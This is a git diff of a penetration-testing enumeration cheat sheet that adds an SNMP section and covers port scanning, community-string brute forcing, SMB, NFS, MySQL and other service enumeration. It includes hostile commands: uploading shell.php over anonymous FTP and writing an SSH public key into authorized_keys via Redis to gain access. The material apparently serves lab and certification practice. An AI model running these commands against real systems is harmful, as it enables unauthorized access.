+* SNMP is based on UDP, a simple, stateless protocol, and is therefore susceptible to IP spoofing, and replay attacks.
+* In addition, the commonly used SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning SNMP information and credentials can be easily intercepted over a local network.
+* For all these reasons, SNMP is another of our favorite enumeration protocols.
+
+#### MIB Tree \(SNMP Management Information Base\)
+
+* \(MIB\) is a database containing information usually related to network management.
+* The database is organized like a tree, where branches represent different organizations or network functions. The leaves of the tree \(final endpoints\) correspond to specific variable values that can then be accessed, and probed, by an external user.
+* [Read more about the MIB](http://www-01.ibm.com/support/knowledgecenter/ssw_aix_53/com.ibm.aix.progcomm/doc/progcomc/mib.htm%23jkmb0ria)
+
+#### Scanning for SNMP
+
+```text
+> nmap -sU --open -p 161 192.168.11.200-254 -oG mega-snmp.txt
+# -sU :: UDP scan
+```
+
+* Alternatively, we can use a tool such as **onesixtyone**, which will check for given community strings against an IP list, allowing us to brute force various community strings.
+
+  ```text
+  > echo public > community
+  > echo private >> community
+  > echo manager >> community
+  > for ip in $(seq 200 254);do echo 192.168.11.$ip;done > ips
+  > onesixtyone -c community i ips
+  ```
+
+  Once these SNMP services are found, we can start querying them for specific MIB data that might be interesting to us.
+
+#### Windows SNMP Enumeration Example
+
+* We can probe and query SNMP values using a tool such as **snmpwalk** provided we at least know the SNMP read-only community string, which in most cases is “public”.
+* Using some of the MIB values provided above, we could attempt to enumerate their corresponding values.
+* Try out the following examples against a known machine in the labs, which has a Windows SNMP port exposed with the community string “public”.
+
+  ```text
+  # Enumerating the Entire MIB Tree
+  > snmpwalk  c public -v1 192.168.11.219
+
+  # Enumerating Windows Users:
+  > snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25
+
+  # Enumerating Running Windows Processes:
+  > snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2
+
+  # Enumerating Open TCP Ports:
+  > snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.6.13.1.3
+
+  # Enumerating Installed Software:
+  > snmpwalk -c public v1 192.168.11.204 1.3.6.1.2.1.25.6.3.1.2
+  ```
+
+* try to Use **snmpwalk** and **snmpcheck** to gather information about the discovered targets.
+
 ## -----
 
 **Port Scanning :**
 
-```
+```text
 nmap -sC -sV -o nmap -A -T5 10.10.10.x
 
 Host Discovery
@@ -1454,7 +1504,7 @@ Port specific NSE script list :
 
 **Scanning all 65535 ports :**
 
-```
+```text
 masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
 ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
 nmap -Pn -sV -sC -p$ports 10.10.10.x
@@ -1463,19 +1513,19 @@ Running specific NSE scripts :
     nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A
 ```
 
-Optional - **sT** (performs full TCP handshake scan instead of syn-scan to prevent getting flagged by firewalls)
+Optional - **sT** \(performs full TCP handshake scan instead of syn-scan to prevent getting flagged by firewalls\)
 
-From Apache Version to finding Ubuntu version -> ubuntu httpd versions
+From Apache Version to finding Ubuntu version -&gt; ubuntu httpd versions
 
-**FTP : (Port 21)**
+**FTP : \(Port 21\)**
 
-* anonymous login check&#x20;
-  * ftp \<ip address>
+* anonymous login check 
+  * ftp &lt;ip address&gt;
   * username : anonymous
   * pwd : anonymous
-  * file upload -> put shell.php
+  * file upload -&gt; put shell.php
 
-**SSH : (Port 22)**
+**SSH : \(Port 22\)**
 
 **id\_rsa.pub : Public key that can be used in authorized\_keys for login**
 
@@ -1486,7 +1536,7 @@ From Apache Version to finding Ubuntu version -> ubuntu httpd versions
 * For passwordless login, add id\_rsa.pub to target's authorized\_keys
 * ssh2john
 
-**DNS Zone transfer check : (Port 53)**
+**DNS Zone transfer check : \(Port 53\)**
 
 * If port 53 is open
 * Add host to /etc/hosts
@@ -1494,28 +1544,28 @@ From Apache Version to finding Ubuntu version -> ubuntu httpd versions
 * [https://ghostphisher.github.io/smasher2](https://ghostphisher.github.io/smasher2)
 * Add the extracted domain to /etc/hosts and dig again
 
-**RPC Bind (111)**
+**RPC Bind \(111\)**
 
-```
+```text
 rpcclient --user="" --command=enumprivs -N 10.10.10.10
 rpcinfo –p 10.10.10.10
 rpcbind -p 10.10.10.10 
 ```
 
-**RPC (135)**
+**RPC \(135\)**
 
-```
+```text
 rpcdump.py 10.11.1.121 -p 135
 rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np // get pipe names
 
 rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
 ```
 
-**SMB (139 & 445)**
+**SMB \(139 & 445\)**
 
-****[**https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html**](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)****
+\*\*\*\*[**https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html**](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)\*\*\*\*
 
-```
+```text
 nmap --script smb-protocols 10.10.10.10
 
 smbclient -L //10.10.10.10
@@ -1567,34 +1617,43 @@ Checklist :
 * SambaCry - CVE-2017-7494
   * **4.5.9** version and before
   * [https://github.com/opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)
-*
+* 
+**SNMP \(161\)** 
 
-**IRC (194,6667,6660-7000)**
+* ```
+  snmpwalk -c public -v1 10.0.0.0
+  snmpcheck -t 192.168.1.X -c public
+  onesixtyone -c names -i hosts
+  nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
+  snmpenum -t 192.168.1.X
+  ```
+
+**IRC \(194,6667,6660-7000\)**
 
 * nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
-* ****[**https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor**](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) **(exploit code)**
+* \*\*\*\*[**https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor**](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) **\(exploit code\)**
 
-**NFS (2049)**
+**NFS \(2049\)**
 
 * showmount -e 10.1.1.27
 * mkdir /mnt/nfs
 * mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
-* Permission Denied ? ([https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/))
+* Permission Denied ? \([https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/)\)
 
-**MYSQL (3306)**
+**MYSQL \(3306\)**
 
 * nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
 
-**Redis (6379)**
+**Redis \(6379\)**
 
-In the output of config get \* you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated\_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:&#x20;
+In the output of config get \* you could find the home of the redis user \(usually /var/lib/redis or /home/redis/.ssh\), and knowing this you know where you can write the authenticated\_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it: 
 
 1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
 2. Write the public key to a file : `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`
-3. Import the file into redis : `cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit`&#x20;
+3. Import the file into redis : `cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit` 
 4. Save the public key to the `authorized_keys` file on redis server:
 
-```
+```text
 root@Urahara:~# redis-cli -h 10.85.0.52
 10.85.0.52:6379> config set dir /home/test/.ssh/
 OK
@@ -1606,7 +1665,7 @@ OK
 
 **Port Knocking :**
 
-```
+```text
 TCP
 knock -v 192.168.0.116 4 27391 159
 
@@ -1616,4 +1675,6 @@ knock -v 192.168.0.116 4 27391 159 -u
 TCP & UDP
 knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
 ```
+
+
 
